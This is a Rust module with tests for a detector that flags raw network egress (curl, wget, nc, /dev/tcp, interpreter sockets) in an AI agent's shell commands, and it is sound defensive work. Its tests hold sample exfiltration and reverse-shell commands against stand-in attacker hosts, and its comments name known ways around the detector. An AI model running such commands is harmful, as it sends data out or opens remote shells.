//! L1 network-egress *detector*: recognizes raw outbound-network commands in a
//! `bash.exec` string and extracts their target host when it is statically
//! provable.
//!
//! This module is a **detector, not a policy** — exactly like
//! [`crate::detect_hardline`]. It answers two questions and nothing more:
//! "is this command performing raw network egress?" and "what host is it
//! reaching, if that host is written literally in the command?" It reads no
//! config, no env var, and no allowlist. The *decision* (allow loopback /
//! tailnet, deny the rest, point the model at the governed
//! `http:<binding>.request` fabric) is made at each shell dispatch site, where
//! the egress policy is available. Keeping this crate config-free is why the
//! host predicate (`ansible_mesh_core::mcp_upstream::McpEgressPolicy::host_allowed`)
//! lives at the call site and not here.
//!
//! Scope is deliberately the small set of raw fetch/exfil primitives an
//! honest-but-wrong or lightly-injected agent reaches for first: `curl`,
//! `wget`, `nc`/`ncat`/`netcat`, the bash `/dev/tcp` and `/dev/udp`
//! pseudo-devices, and interpreter one-liners that open a network sink
//! (`python -c`, `node -e`, `perl -e`, `ruby -e`). It is **not** a general
//! network sandbox: `git`, `gh`, `ssh`/`scp`, and package managers
//! (`brew`/`cargo`/`npm`/`pip`) are network-capable but are ordinary dev/admin
//! tooling with their own semantics and are deliberately out of scope for this
//! slice — see the Outbound Integration Fabric proposal for the honest scope.
//! A regex over shell text also loses to base64, a written-then-run script, or
//! `exec 3<>/dev/tcp`; what this buys is closing the *accidental and lightly
//! injected* path and making the governed door the obvious one, not making
//! egress impossible.
//!
//! Fail-closed posture: when egress is detected but the host cannot be proven
//! (`curl $URL`, `python -c '...socket...'`), [`NetworkEgressMatch::host`] is
//! `None`, and the call site treats an unresolvable host as *deny* — matching
//! the empty-default-deny idiom of the MCP stdio allowlist.

use std::sync::LazyLock;

use regex::Regex;

use crate::patterns::CMDPOS;

/// A `bash.exec` command detected as raw network egress.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NetworkEgressMatch {
    /// The egress primitive that matched (`"curl"`, `"wget"`, `"nc"`,
    /// `"/dev/tcp"`, `"interpreter socket"`), for logging and the denial
    /// message.
    pub tool: &'static str,
    /// The target host, extracted only when it is written literally in the
    /// command. `None` means the host is dynamic or unparseable — the call
    /// site must fail closed (deny) on `None`.
    pub host: Option<String>,
}

impl NetworkEgressMatch {
    /// The message returned to the model when the call site denies this
    /// egress. Points at the governed path rather than telling the model the
    /// command is universally forbidden — unlike a hardline denial, a governed
    /// binding or an operator allowlist entry *can* satisfy this need.
    pub fn denial_message(&self) -> String {
        let target = self
            .host
            .as_deref()
            .map(|h| format!("to {h}"))
            .unwrap_or_else(|| "to a dynamic/unresolvable host".to_string());
        format!(
            "blocked from raw network egress via bash.exec ({tool} {target}). The sanctioned \
             outbound path is a governed integration binding — the `http:<binding>.request` \
             tool — which enforces host allowlists, DNS pinning, the secret-ref credential \
             boundary, and a content-free audit trail. Raw shell egress bypasses all of that. \
             Loopback and tailnet hosts are allowed here; to reach any other host, use an \
             existing binding, ask the operator to register one, or have the operator widen \
             PHILOTIC_SHELL_EGRESS_ALLOW. Do not rephrase this into a different shell fetch.",
            tool = self.tool,
        )
    }
}

/// `curl`/`wget` at a command-word position. Presence is the trigger; the host
/// is recovered separately from the first URL-shaped token.
static CURL_WGET_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(&format!(r"{CMDPOS}(?:curl|wget)(?:\s|$)")).expect("static regex"));

/// `nc`/`ncat`/`netcat` at a command-word position, capturing the first
/// non-flag argument (the host) and requiring a trailing numeric port so plain
/// `nc -h` and flagless usages do not trip.
static NC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r"{CMDPOS}(?:nc|ncat|netcat)\s+(?:-[^\s]+\s+)*([^\s-][^\s]*)\s+\d"
    ))
    .expect("static regex")
});

/// `nc`/`ncat`/`netcat` at a command-word position with no parseable host —
/// still egress, host `None` (fail closed).
static NC_BARE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(r"{CMDPOS}(?:nc|ncat|netcat)(?:\s|$)")).expect("static regex")
});

/// bash `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` pseudo-device egress,
/// capturing the host.
static DEV_NET_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"/dev/(?:tcp|udp)/([^/\s]+)/").expect("static regex"));

/// Interpreter one-liner (`python -c`, `node -e`, `perl -e`, `ruby -e`,
/// `php -r`) at a command-word position. The interpreter alone is not egress;
/// [`INTERP_SINK_RE`] must also match a network-sink token.
static INTERP_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r"{CMDPOS}(?:python3?|perl|ruby|node|php)\b[^\n]*\s-(?:c|e|r)\b"
    ))
    .expect("static regex")
});

/// Network-sink tokens that turn an interpreter one-liner into egress. Kept
/// tight (an explicit call/module, not a bare `import`) to limit false
/// positives on local compute that merely references a networking library.
static INTERP_SINK_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)socket\.socket|urllib|urlopen|requests\.|httpx|http\.client|net/http|net::http|open-uri|net\.connect|http\.(?:get|request)|require\(\s*['"](?:https?|net|dgram|tls)['"]|fetch\(|/dev/(?:tcp|udp)/"#,
    )
    .expect("static regex")
});

/// First URL-shaped token (`http://…`/`https://…`) with no shell metacharacter
/// in its authority, so `curl http://127.0.0.1:8900/x` resolves but
/// `curl "$URL"` does not.
static HTTP_URL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"https?://[^\s'"`|>&]+"#).expect("static regex"));

/// Detect raw network egress in an already-[normalized](crate::normalize_command)
/// command. Rules are tried in declaration order; the first match wins.
pub(crate) fn detect(normalized: &str) -> Option<NetworkEgressMatch> {
    // /dev/tcp|udp first: it is unambiguous and can appear as a redirect
    // target of an otherwise-innocent-looking builtin (`echo > /dev/tcp/...`).
    if let Some(caps) = DEV_NET_RE.captures(normalized) {
        return Some(NetworkEgressMatch {
            tool: "/dev/tcp",
            host: resolvable_host(caps.get(1).map(|m| m.as_str())),
        });
    }

    if CURL_WGET_RE.is_match(normalized) {
        let tool = if normalized.contains("wget") {
            "wget"
        } else {
            "curl"
        };
        return Some(NetworkEgressMatch {
            tool,
            host: host_from_first_url(normalized),
        });
    }

    if let Some(caps) = NC_RE.captures(normalized) {
        return Some(NetworkEgressMatch {
            tool: "nc",
            host: resolvable_host(caps.get(1).map(|m| m.as_str())),
        });
    }
    if NC_BARE_RE.is_match(normalized) {
        return Some(NetworkEgressMatch {
            tool: "nc",
            host: None,
        });
    }

    if INTERP_RE.is_match(normalized) && INTERP_SINK_RE.is_match(normalized) {
        return Some(NetworkEgressMatch {
            tool: "interpreter socket",
            // Interpreter targets are effectively never statically parseable
            // from shell text — fail closed.
            host: None,
        });
    }

    None
}

/// Extract the host of the first literal `http(s)://` URL in the command.
/// Returns `None` when there is no literal URL (e.g. the URL is in a variable).
fn host_from_first_url(command: &str) -> Option<String> {
    let url = HTTP_URL_RE.find(command)?.as_str();
    let host = host_from_http_url(url)?;
    resolvable_host(Some(&host))
}

/// A host token is "resolvable" for policy purposes only if it contains no
/// shell-expansion metacharacter. A token like `$HOST` or `${h}` cannot be
/// judged against an allowlist, so it is treated as unknown (`None`).
fn resolvable_host(host: Option<&str>) -> Option<String> {
    let host = host?.trim().trim_matches(['[', ']']);
    if host.is_empty() || host.contains(['$', '`', '(', '*']) {
        return None;
    }
    Some(host.to_string())
}

/// Extract the host portion of an `http(s)://` URL without a URL crate. A
/// deliberate ~12-line duplicate of `ansible_mesh_core::host_from_http_url`:
/// exec-guard must stay dependency- and policy-free (it is the safety floor
/// every other crate sits above), so it cannot depend on the shared crate that
/// owns the egress policy — and that crate should not depend on the floor for a
/// string helper either. The two must agree; they are covered by tests on both
/// sides.
fn host_from_http_url(url: &str) -> Option<String> {
    let rest = url
        .strip_prefix("http://")
        .or_else(|| url.strip_prefix("https://"))?;
    let authority = rest.split(['/', '?', '#']).next()?;
    let host_port = authority.rsplit('@').next()?;
    let host = if let Some(v6) = host_port.strip_prefix('[') {
        v6.split(']').next()?
    } else {
        host_port.split(':').next()?
    };
    if host.is_empty() {
        None
    } else {
        Some(host.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::detect;
    use crate::normalize_command;

    fn run(cmd: &str) -> Option<super::NetworkEgressMatch> {
        detect(&normalize_command(cmd))
    }

    #[test]
    fn curl_wget_detected_with_host() {
        let m = run("curl https://evil.example.com/x").expect("egress");
        assert_eq!(m.tool, "curl");
        assert_eq!(m.host.as_deref(), Some("evil.example.com"));

        let m = run("wget http://data.exfil.net:8080/a/b").expect("egress");
        assert_eq!(m.tool, "wget");
        assert_eq!(m.host.as_deref(), Some("data.exfil.net"));
    }

    #[test]
    fn loopback_and_tailnet_hosts_are_extracted_verbatim() {
        // The call site allows these via McpEgressPolicy; the detector's job
        // is only to hand back the literal host so that decision can be made.
        assert_eq!(
            run("curl -X POST http://127.0.0.1:8900/api/test-run")
                .unwrap()
                .host
                .as_deref(),
            Some("127.0.0.1")
        );
        assert_eq!(
            run("curl http://100.64.212.8:8750/mcp")
                .unwrap()
                .host
                .as_deref(),
            Some("100.64.212.8")
        );
        assert_eq!(
            run("curl http://localhost:7700/").unwrap().host.as_deref(),
            Some("localhost")
        );
    }

    #[test]
    fn dynamic_url_host_is_none_fail_closed() {
        assert!(run("curl $URL").unwrap().host.is_none());
        assert!(run("curl \"$MY_ENDPOINT/path\"").unwrap().host.is_none());
        assert!(run("curl http://$HOST/x").unwrap().host.is_none());
        assert!(run("wget").unwrap().host.is_none());
    }

    #[test]
    fn nc_detected_with_and_without_host() {
        assert_eq!(
            run("nc attacker.example.com 4444").unwrap().host.as_deref(),
            Some("attacker.example.com")
        );
        // Reverse shell with a value-taking flag (`-e /bin/sh`): host parsing
        // from arbitrary nc flags is best-effort, so we only guarantee the
        // command is flagged as egress. Whatever token is extracted is
        // non-loopback, so the call-site policy denies it regardless.
        let m = run("nc -e /bin/sh 10.0.0.1 9001").expect("egress");
        assert_eq!(m.tool, "nc");
        assert_ne!(m.host.as_deref(), Some("127.0.0.1"));
        // No parseable host+port pair, but still flagged as egress.
        assert!(run("ncat --ssl somewhere").unwrap().host.is_none());
    }

    #[test]
    fn dev_tcp_pseudo_device_detected() {
        let m = run("echo data > /dev/tcp/198.51.100.9/443/").expect("egress");
        assert_eq!(m.tool, "/dev/tcp");
        assert_eq!(m.host.as_deref(), Some("198.51.100.9"));
    }

    #[test]
    fn interpreter_socket_oneliners_detected_host_none() {
        assert_eq!(
            run("python3 -c 'import socket; socket.socket()'")
                .unwrap()
                .tool,
            "interpreter socket"
        );
        assert!(
            run("python -c \"import urllib.request; urllib.request.urlopen('http://x')\"")
                .unwrap()
                .host
                .is_none()
        );
        assert_eq!(
            run("node -e \"require('http').get('http://x')\"")
                .unwrap()
                .tool,
            "interpreter socket"
        );
    }

    #[test]
    fn command_position_anchoring_ignores_curl_as_data() {
        // "curl" appearing only inside a quoted argument is not a command.
        assert!(run("echo 'run curl https://x to fetch'").is_none());
        assert!(run("git commit -m \"add curl example\"").is_none());
    }

    #[test]
    fn curl_after_pipe_or_separator_is_a_command() {
        assert!(run("echo hi | curl https://evil.example.com").is_some());
        assert!(run("true; curl https://evil.example.com").is_some());
    }

    #[test]
    fn ordinary_and_out_of_scope_commands_are_not_egress() {
        // Deliberately out of scope for this slice: dev/admin tooling with
        // their own semantics. They must NOT trip the fence.
        assert!(run("git status").is_none());
        assert!(run("git push origin main").is_none());
        assert!(run("gh pr create").is_none());
        assert!(run("cargo build --workspace").is_none());
        assert!(run("npm install").is_none());
        assert!(run("ssh deploy@jane-vps true").is_none());
        assert!(run("ls -la /tmp").is_none());
        // Interpreter with no network sink is local compute, not egress.
        assert!(run("python3 -c 'print(2+2)'").is_none());
    }
}
